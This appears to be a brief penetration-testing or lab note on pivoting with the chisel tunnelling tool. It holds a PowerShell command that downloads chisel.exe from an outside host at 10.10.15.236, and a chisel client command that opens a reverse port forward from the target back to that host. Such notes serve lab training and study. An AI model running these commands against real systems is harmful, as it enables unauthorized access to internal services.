server
```powershell
iwr -uri http://10.10.15.236:8088/chisel.exe -OutFile chisel.exe
```
![](Attachments/Pasted%20image%2020260826154655.png)

client
[Releases · jpillora/chisel](https://github.com/jpillora/chisel/releases)
```powershell
\chisel.exe client 10.10.15.236:8000 R:17017:127.0.0.1:17017
```
![](Attachments/Pasted%20image%2020260826154747.png)